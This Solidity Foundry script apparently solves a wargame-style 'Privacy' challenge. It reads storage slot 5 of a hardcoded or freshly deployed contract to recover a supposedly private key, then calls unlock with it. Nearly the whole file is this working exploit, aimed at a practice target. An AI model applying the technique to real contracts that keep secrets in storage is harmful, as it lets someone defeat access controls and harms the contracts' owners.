// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "../src/Privacy.sol";
import "forge-std/Script.sol";
import "forge-std/console.sol"; 

contract PrivacyScript is Script {

    Privacy private privacyContract;
    uint256 deployerPrivateKey = vm.envUint("PRIVATE_KEY");

    function run() external {
        console.log("Solving Privacy Contract...");
        privacyContract = Privacy(payable(0x960072BAB02BE3736F3bCE60604966b73c70Cb3C));

        uint256 id;
        assembly {
            id := chainid()
        }

        if (id== 80002) {
           
        } else {
            vm.startBroadcast(deployerPrivateKey);

            // Deploy a new contract
            privacyContract = new Privacy([bytes32(0), bytes32(0), bytes32(0)]);
            vm.stopBroadcast();
        }

        console.log("Privacy Contract Address: ", address(privacyContract));

        // Check the initial lock state
        console.log("State of lock: ", privacyContract.locked());

        // Attempt to unlock with a known key (for example purposes)
         bytes32 myKey = vm.load(address(privacyContract), bytes32(uint256(5)));

        vm.startBroadcast(deployerPrivateKey);

        // Call the unlock function with the known key
        privacyContract.unlock(bytes16(myKey));

        vm.stopBroadcast();

        if (!privacyContract.locked()) {
            console.log("Lock successfully opened with key");
        } else {
            console.log("Failed to unlock the contract with the provided key.");
        }
    }
}
